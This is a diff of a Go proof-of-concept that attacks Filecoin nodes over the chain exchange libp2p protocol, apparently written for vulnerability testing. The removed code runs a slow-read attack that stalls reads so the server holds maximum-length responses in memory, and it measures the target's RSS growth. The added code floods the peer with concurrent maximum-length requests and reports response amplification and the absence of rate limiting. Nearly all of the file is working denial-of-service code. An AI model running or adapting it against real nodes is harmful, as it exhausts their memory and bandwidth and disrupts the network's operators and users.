@@ -12,7 +12,6 @@ import (
 	"strconv"
 	"strings"
 	"sync"
-	"sync/atomic"
 	"time"
 
 	"github.com/ipfs/go-cid"
@@ -24,60 +23,27 @@ import (
 	"github.com/multiformats/go-multiaddr"
 )
 
-const chainExchangeProtocol = "/fil/chain/xchg/0.0.1"
+const proto = "/fil/chain/xchg/0.0.1"
 
-/// max time to run attack before collecting results
-const attackWindow = 70 * time.Second
-
-/// encodeRequest builds CBOR-encoded chain exchange request
-/// format matches chain/exchange/cbor_gen.go Request.MarshalCBOR
-func encodeRequest(heads []cid.Cid, length, options uint64) []byte {
-	var buf bytes.Buffer
-
-	/// array(3)
-	buf.WriteByte(0x83)
-
-	/// heads: array of CIDs with tag 42 + null-prefixed bytes
-	writeArrayHeader(&buf, len(heads))
+// cbor encode Request{Head, Length, Options}
+func encodeReq(heads []cid.Cid, length, opts uint64) []byte {
+	var b bytes.Buffer
+	b.WriteByte(0x83)
+	b.WriteByte(0x80 | byte(len(heads)))
 	for _, c := range heads {
-		buf.Write([]byte{0xd8, 0x2a}) /// tag(42)
-		cidBytes := append([]byte{0x00}, c.Bytes()...)
-		writeBytes(&buf, cidBytes)
+		b.Write([]byte{0xd8, 0x2a})
+		cb := append([]byte{0x00}, c.Bytes()...)
+		if len(cb) < 24 {
+			b.WriteByte(0x40 | byte(len(cb)))
+		} else {
+			b.WriteByte(0x58)
+			b.WriteByte(byte(len(cb)))
+		}
+		b.Write(cb)
 	}
-
-	/// length: uint64
-	writeUint(&buf, length)
-
-	/// options: uint64
-	writeUint(&buf, options)
-
-	return buf.Bytes()
-}
-
-func writeArrayHeader(w *bytes.Buffer, n int) {
-	if n < 24 {
-		w.WriteByte(0x80 | byte(n))
-	} else if n < 256 {
-		w.WriteByte(0x98)
-		w.WriteByte(byte(n))
-	} else {
-		w.WriteByte(0x99)
-		binary.Write(w, binary.BigEndian, uint16(n))
-	}
-}
-
-func writeBytes(w *bytes.Buffer, data []byte) {
-	n := len(data)
-	if n < 24 {
-		w.WriteByte(0x40 | byte(n))
-	} else if n < 256 {
-		w.WriteByte(0x58)
-		w.WriteByte(byte(n))
-	} else {
-		w.WriteByte(0x59)
-		binary.Write(w, binary.BigEndian, uint16(n))
-	}
-	w.Write(data)
+	writeUint(&b, length)
+	writeUint(&b, opts)
+	return b.Bytes()
 }
 
 func writeUint(w *bytes.Buffer, v uint64) {
@@ -85,116 +51,64 @@ func writeUint(w *bytes.Buffer, v uint64) {
 	case v < 24:
 		w.WriteByte(byte(v))
 	case v < 256:
-		w.WriteByte(0x18)
-		w.WriteByte(byte(v))
+		w.Write([]byte{0x18, byte(v)})
 	case v < 65536:
 		w.WriteByte(0x19)
 		binary.Write(w, binary.BigEndian, uint16(v))
-	case v < 4294967296:
-		w.WriteByte(0x1a)
-		binary.Write(w, binary.BigEndian, uint32(v))
 	default:
 		w.WriteByte(0x1b)
 		binary.Write(w, binary.BigEndian, v)
 	}
 }
 
-/// getChainHead fetches current tipset CIDs via JSON-RPC
-func getChainHead(api string) ([]cid.Cid, error) {
-	body := `{"jsonrpc":"2.0","method":"Filecoin.ChainHead","params":[],"id":1}`
-	resp, err := http.Post(api, "application/json", strings.NewReader(body))
+func getHead(api string) ([]cid.Cid, error) {
+	resp, err := http.Post(api, "application/json",
+		strings.NewReader(`{"jsonrpc":"2.0","method":"Filecoin.ChainHead","params":[],"id":1}`))
 	if err != nil {
 		return nil, err
 	}
 	defer resp.Body.Close()
-
 	data, _ := io.ReadAll(resp.Body)
-	var res struct {
-		Result struct {
-			Cids []cid.Cid `json:"Cids"`
-		} `json:"result"`
-	}
-	if err := json.Unmarshal(data, &res); err != nil {
-		return nil, err
-	}
-	return res.Result.Cids, nil
+	var r struct{ Result struct{ Cids []cid.Cid } }
+	json.Unmarshal(data, &r)
+	return r.Result.Cids, nil
 }
 
-/// getRSS reads VmRSS from /proc/<pid>/status
-func getRSS(pid int) uint64 {
+func getRSS(pid int) int64 {
 	if pid <= 0 {
 		return 0
 	}
-	path := fmt.Sprintf("/proc/%d/status", pid)
-	data, err := os.ReadFile(path)
-	if err != nil {
-		return 0
-	}
+	data, _ := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
 	for _, line := range strings.Split(string(data), "\n") {
 		if strings.HasPrefix(line, "VmRSS:") {
-			fields := strings.Fields(line)
-			if len(fields) >= 2 {
-				v, _ := strconv.ParseUint(fields[1], 10, 64)
-				return v * 1024
-			}
+			v, _ := strconv.ParseInt(strings.Fields(line)[1], 10, 64)
+			return v
 		}
 	}
 	return 0
 }
 
-/// debugRSS prints raw VmRSS line for verification
-func debugRSS(pid int) {
-	if pid <= 0 {
-		return
-	}
-	path := fmt.Sprintf("/proc/%d/status", pid)
-	data, err := os.ReadFile(path)
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "debug: cannot read %s: %v\n", path, err)
-		return
-	}
-	for _, line := range strings.Split(string(data), "\n") {
-		if strings.HasPrefix(line, "VmRSS:") {
-			fmt.Fprintf(os.Stderr, "debug: %s\n", strings.TrimSpace(line))
-			return
-		}
-	}
-	fmt.Fprintf(os.Stderr, "debug: VmRSS not found in %s\n", path)
+type result struct {
+	ok   bool
+	size int
 }
 
-/// attackStream opens stream, sends max-length request, stalls read to pin server memory
-/// returns true if stream was successfully opened and request sent
-func attackStream(ctx context.Context, h host.Host, target peer.ID, req []byte, active *int64) bool {
-	atomic.AddInt64(active, 1)
-	defer atomic.AddInt64(active, -1)
-
-	stream, err := h.NewStream(ctx, target, chainExchangeProtocol)
+func attack(ctx context.Context, h host.Host, t peer.ID, req []byte, out chan<- result) {
+	r := result{}
+	s, err := h.NewStream(ctx, t, proto)
 	if err != nil {
-		return false
+		out <- r
+		return
 	}
-	defer stream.Close()
+	defer s.Close()
 
-	/// send request
-	if _, err := stream.Write(req); err != nil {
-		return false
-	}
-	stream.CloseWrite()
-
-	/// stall read: 1 byte every 5s triggers TCP backpressure
-	/// server goroutine blocks on write with 60s deadline, pinning full response in heap
-	buf := make([]byte, 1)
-	for {
-		select {
-		case <-ctx.Done():
-			return true
-		default:
-		}
-		stream.SetReadDeadline(time.Now().Add(10 * time.Second))
-		if _, err := stream.Read(buf); err != nil {
-			return true
-		}
-		time.Sleep(5 * time.Second)
-	}
+	s.Write(req)
+	s.CloseWrite()
+	s.SetReadDeadline(time.Now().Add(120 * time.Second))
+	data, _ := io.ReadAll(s)
+	r.ok = true
+	r.size = len(data)
+	out <- r
 }
 
 func main() {
@@ -203,107 +117,77 @@ func main() {
 		os.Exit(1)
 	}
 
-	api := os.Args[1]
-	addr := os.Args[2]
-	peerStr := os.Args[3]
-	numStreams, _ := strconv.Atoi(os.Args[4])
+	api, addr, peerStr := os.Args[1], os.Args[2], os.Args[3]
+	n, _ := strconv.Atoi(os.Args[4])
 	pid := 0
 	if len(os.Args) > 5 {
 		pid, _ = strconv.Atoi(os.Args[5])
 	}
 
-	/// fetch valid chain head for request
-	heads, err := getChainHead(api)
+	heads, err := getHead(api)
 	if err != nil {
-		fmt.Fprintf(os.Stderr, "failed to get chain head: %v\n", err)
+		fmt.Fprintf(os.Stderr, "getHead: %v\n", err)
 		os.Exit(1)
 	}
 
-	/// encode request once: Length=900 (MaxRequestLength), Options=3 (Headers|Messages)
-	req := encodeRequest(heads, 900, 3)
+	// Length=900 (MaxRequestLength), Options=3 (Headers|Messages)
+	req := encodeReq(heads, 900, 3)
 
-	/// setup libp2p host
 	priv, _, _ := crypto.GenerateKeyPair(crypto.Ed25519, -1)
-	h, err := libp2p.New(libp2p.Identity(priv))
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "libp2p: %v\n", err)
-		os.Exit(1)
-	}
+	h, _ := libp2p.New(libp2p.Identity(priv))
 	defer h.Close()
 
-	/// connect to target
 	ma, _ := multiaddr.NewMultiaddr(addr)
 	target, _ := peer.Decode(peerStr)
 	h.Peerstore().AddAddr(target, ma, peerstore.PermanentAddrTTL)
 
-	ctx, cancel := context.WithTimeout(context.Background(), attackWindow)
-	defer cancel()
-
+	ctx := context.Background()
 	if err := h.Connect(ctx, peer.AddrInfo{ID: target, Addrs: []multiaddr.Multiaddr{ma}}); err != nil {
 		fmt.Fprintf(os.Stderr, "connect: %v\n", err)
 		os.Exit(1)
 	}
 
-	baseline := getRSS(pid)
-	debugRSS(pid)
-
-	/// memory monitor tracks peak RSS during attack
-	var peak uint64
-	var peakMu sync.Mutex
-	done := make(chan struct{})
-
-	go func() {
-		tick := time.NewTicker(500 * time.Millisecond)
-		defer tick.Stop()
-		for {
-			select {
-			case <-tick.C:
-				if rss := getRSS(pid); rss > 0 {
-					peakMu.Lock()
-					if rss > peak {
-						peak = rss
-					}
-					peakMu.Unlock()
-				}
-			case <-done:
-				return
-			}
-		}
-	}()
-
-	/// launch concurrent attack streams
+	baseRSS := getRSS(pid)
+	results := make(chan result, n)
 	var wg sync.WaitGroup
-	var active int64
-	var successCount int64
 
-	for i := 0; i < numStreams; i++ {
+	t0 := time.Now()
+	for i := 0; i < n; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			if attackStream(ctx, h, target, req, &active) {
-				atomic.AddInt64(&successCount, 1)
-			}
+			attack(ctx, h, target, req, results)
 		}()
-		/// slight stagger to avoid connection storm
-		time.Sleep(10 * time.Millisecond)
+	}
+	go func() { wg.Wait(); close(results) }()
+
+	var ok, total int
+	var peakRSS int64
+	for r := range results {
+		if rss := getRSS(pid); rss > peakRSS {
+			peakRSS = rss
+		}
+		if r.ok {
+			ok++
+			total += r.size
+		}
 	}
 
-	/// wait for context timeout or all streams complete
-	wg.Wait()
-	close(done)
-
-	/// collect final metrics
-	peakMu.Lock()
-	finalPeak := peak
-	peakMu.Unlock()
-	finalRSS := getRSS(pid)
-
-	/// output results
-	if pid > 0 && baseline > 0 {
-		growthMB := int64(finalPeak-baseline) >> 20
-		fmt.Printf("PASS: baseline_mb=%d peak_mb=%d final_mb=%d growth_mb=%d streams=%d success=%d\n",
-			baseline>>20, finalPeak>>20, finalRSS>>20, growthMB, numStreams, successCount)
-	} else {
-		fmt.Printf("DONE: streams=%d success=%d\n", numStreams, successCount)
+	fmt.Printf("streams: %d/%d\n", ok, n)
+	fmt.Printf("response: %d bytes total, %d avg\n", total, total/max(ok, 1))
+	fmt.Printf("amplification: %.0fx\n", float64(total)/float64(len(req)*max(ok, 1)))
+	fmt.Printf("time: %.2fs\n", time.Since(t0).Seconds())
+	if pid > 0 && baseRSS > 0 {
+		fmt.Printf("rss: %dM -> %dM (peak %dM)\n", baseRSS/1024, getRSS(pid)/1024, peakRSS/1024)
 	}
+	if ok == n {
+		fmt.Println("no rate limiting")
+	}
+}
+
+func max(a, b int) int {
+	if a > b {
+		return a
+	}
+	return b
 }
